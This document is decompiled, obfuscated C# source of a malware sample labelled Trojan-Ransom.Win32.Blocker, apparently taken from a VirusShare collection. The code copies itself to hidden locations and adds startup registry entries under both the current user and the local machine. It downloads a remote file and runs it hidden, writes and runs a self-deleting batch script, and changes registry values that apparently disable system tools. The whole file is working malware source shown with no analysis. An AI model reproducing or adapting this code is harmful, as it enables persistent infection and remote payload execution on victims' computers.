// Decompiled with JetBrains decompiler
// Type: .
// Assembly: N0ise, Version=0.0.0.0, Culture=neutral, PublicKeyToken=0c20d1ec1b896672
// MVID: D793FC76-4529-437D-AFE1-452161AE3687
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\Trojan-Ransom.Win32.Blocker.vml-6d43d819d38c00cda2b09fdf359d51aa5e036b02.exe

using \u0001;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;

namespace \u0004
{
  internal class \u0004
  {
    [NonSerialized]
    internal static \u0001.\u0001 \u0001;
    private Mutex \u0001;

    public void \u0002()
    {
      this.\u0003();
      this.\u0007();
      this.\u0004();
    }

    private void \u0003()
    {
      try
      {
        this.\u0001 = new Mutex(true, \u0005.\u0001.\u0001.\u0003);
        \u000E\u0002.\u007E\u001A\u0002((object) this.\u0001);
      }
      catch
      {
        \u000F\u0002.\u0001\u0002(-1);
      }
    }

    private void \u0004()
    {
      string str1 = \u001C\u0002.\u007E\u0019\u0004((object) \u0087\u0002.\u007E\u0013\u0004((object) \u0091\u0002.\u0017\u0004()));
      if (this.\u0002())
        return;
      try
      {
        foreach (string str2 in \u0005.\u0001.\u0001.\u0003)
        {
          if (!\u0005.\u0001.\u0001.\u0003(str2))
            \u008E\u0002.\u0014\u0003(str1, str2);
          \u0008\u0002.\u0017\u0003(str2, FileAttributes.Hidden);
        }
      }
      catch
      {
      }
      try
      {
        \u008D\u0002.\u007E\u0006\u0003((object) \u009A\u0002.\u007E\u0003\u0003((object) Registry.CurrentUser, \u0004.\u0004.\u0001(1305), true), \u0005.\u0001.\u0001.\u0002[0], (object) \u0010\u0002.\u008E((object) '"', (object) \u0005.\u0001.\u0001.\u0003[0], (object) '"'));
        \u008D\u0002.\u007E\u0006\u0003((object) \u009A\u0002.\u007E\u0003\u0003((object) Registry.LocalMachine, \u0004.\u0004.\u0001(1305), true), \u0005.\u0001.\u0001.\u0002[1], (object) \u0010\u0002.\u008E((object) '"', (object) \u0005.\u0001.\u0001.\u0003[1], (object) '"'));
      }
      catch
      {
      }
      try
      {
        \u000E\u0002.\u007E\u0018\u0002((object) this.\u0001);
        foreach (string str3 in \u0005.\u0001.\u0001.\u0003)
        {
          Process process = new Process();
          \u0016\u0002.\u007E\u001D\u0004((object) \u009F\u0002.\u007E\u0014\u0004((object) process), str3);
          \u0007\u0003.\u007E\u001E\u0004((object) \u009F\u0002.\u007E\u0014\u0004((object) process), ProcessWindowStyle.Hidden);
          int num = \u0094.\u007E\u0018\u0004((object) process) ? 1 : 0;
        }
      }
      catch
      {
      }
      \u000F\u0002.\u0001\u0002(-1);
    }

    public void \u0002([In] string obj0)
    {
      try
      {
        \u000E\u0002.\u007E\u0018\u0002((object) this.\u0001);
      }
      catch
      {
      }
      try
      {
        string str = \u0019\u0003.\u0090(\u0005.\u0001.\u0001.\u0002(\u008C\u0002.\u007E\u000F\u0002((object) new Random(), 5, 12)), \u0004.\u0004.\u0001(428));
        \u009B\u0002.\u0004\u0004((object) new WebClient(), obj0, \u0014\u0003.\u0091(\u0095\u0002.\u0004\u0002(\u0004.\u0004.\u0001(437)), \u0004.\u0004.\u0001(446), str));
        Process process = new Process();
        \u0016\u0002.\u007E\u001D\u0004((object) \u009F\u0002.\u007E\u0014\u0004((object) process), \u0014\u0003.\u0091(\u0095\u0002.\u0004\u0002(\u0004.\u0004.\u0001(437)), \u0004.\u0004.\u0001(446), str));
        \u0007\u0003.\u007E\u001E\u0004((object) \u009F\u0002.\u007E\u0014\u0004((object) process), ProcessWindowStyle.Hidden);
        int num = \u0094.\u007E\u0018\u0004((object) process) ? 1 : 0;
      }
      catch
      {
      }
      this.\u0006();
      \u000F\u0002.\u0001\u0002(-1);
    }

    public void \u0005()
    {
      try
      {
        \u0016\u0002.\u007E\u0002\u0003((object) \u009A\u0002.\u007E\u0003\u0003((object) Registry.CurrentUser, \u0004.\u0004.\u0001(1305), true), \u0005.\u0001.\u0001.\u0002[0]);
        \u0016\u0002.\u007E\u0002\u0003((object) \u009A\u0002.\u007E\u0003\u0003((object) Registry.LocalMachine, \u0004.\u0004.\u0001(1305), true), \u0005.\u0001.\u0001.\u0002[1]);
      }
      catch
      {
      }
      try
      {
        foreach (string str in \u0005.\u0001.\u0001.\u0003)
          \u001B\u0002.\u0015\u0003(str);
      }
      catch
      {
      }
      this.\u0006();
      \u000F\u0002.\u0001\u0002(-1);
    }

    private bool \u0002()
    {
      string[] strArray = \u0005.\u0001.\u0001.\u0003;
      int index = 0;
      if (index < strArray.Length)
        goto label_3;
label_2:
      return true;
label_3:
      string str = strArray[index];
      if (!\u0005.\u0001.\u0001.\u0003(str))
        return false;
      goto label_2;
    }

    private void \u0006()
    {
      try
      {
        object[] objArray = new object[9]
        {
          (object) \u0004.\u0004.\u0001(1366),
          (object) '"',
          (object) \u009A.\u0003\u0002()[0],
          (object) '"',
          (object) \u0004.\u0004.\u0001(1379),
          (object) '"',
          (object) \u0095\u0002.\u001A\u0003(\u001C\u0002.\u007E\u0019\u0004((object) \u0087\u0002.\u007E\u0013\u0004((object) \u0091\u0002.\u0017\u0004()))),
          (object) '"',
          (object) \u0004.\u0004.\u0001(1396)
        };
        string str = \u0094\u0002.\u008F(objArray);
        TextWriter textWriter = (TextWriter) new StreamWriter(\u0019\u0003.\u0090(\u0095\u0002.\u0004\u0002(\u0004.\u0004.\u0001(437)), \u0004.\u0004.\u0001(1409)));
        \u0016\u0002.\u007E\u001E\u0003((object) textWriter, str);
        \u000E\u0002.\u007E\u001D\u0003((object) textWriter);
        Process process = new Process();
        \u0016\u0002.\u007E\u001D\u0004((object) \u009F\u0002.\u007E\u0014\u0004((object) process), \u0019\u0003.\u0090(\u0095\u0002.\u0004\u0002(\u0004.\u0004.\u0001(437)), \u0004.\u0004.\u0001(1409)));
        \u0098.\u007E\u001C\u0004((object) \u009F\u0002.\u007E\u0014\u0004((object) process), false);
        \u0098.\u007E\u001B\u0004((object) \u009F\u0002.\u007E\u0014\u0004((object) process), true);
        int num = \u0094.\u007E\u0018\u0004((object) process) ? 1 : 0;
      }
      catch
      {
      }
    }

    private void \u0007()
    {
      try
      {
        \u0080\u0003.\u007E\u0007\u0003((object) \u009A\u0002.\u007E\u0003\u0003((object) Registry.CurrentUser, \u0004.\u0004.\u0001(1426), true), \u0004.\u0004.\u0001(1507), (object) \u0004.\u0004.\u0001(1516), RegistryValueKind.DWord);
      }
      catch
      {
      }
      if (!\u0005.\u0001.\u0001.\u0015)
        return;
      try
      {
        \u0080\u0003.\u007E\u0007\u0003((object) \u009A\u0002.\u007E\u0003\u0003((object) Registry.CurrentUser, \u0004.\u0004.\u0001(1426), true), \u0004.\u0004.\u0001(1521), (object) \u0004.\u0004.\u0001(1546), RegistryValueKind.DWord);
      }
      catch
      {
      }
      try
      {
        \u0080\u0003.\u007E\u0007\u0003((object) \u009A\u0002.\u007E\u0003\u0003((object) Registry.CurrentUser, \u0004.\u0004.\u0001(1551), true), \u0004.\u0004.\u0001(1628), (object) \u0004.\u0004.\u0001(1546), RegistryValueKind.DWord);
        \u0080\u0003.\u007E\u0007\u0003((object) \u009A\u0002.\u007E\u0003\u0003((object) Registry.LocalMachine, \u0004.\u0004.\u0001(1551), true), \u0004.\u0004.\u0001(1628), (object) \u0004.\u0004.\u0001(1546), RegistryValueKind.DWord);
      }
      catch
      {
      }
    }

    static \u0004() => \u0003.\u0002(typeof (\u0004.\u0004));
  }
}
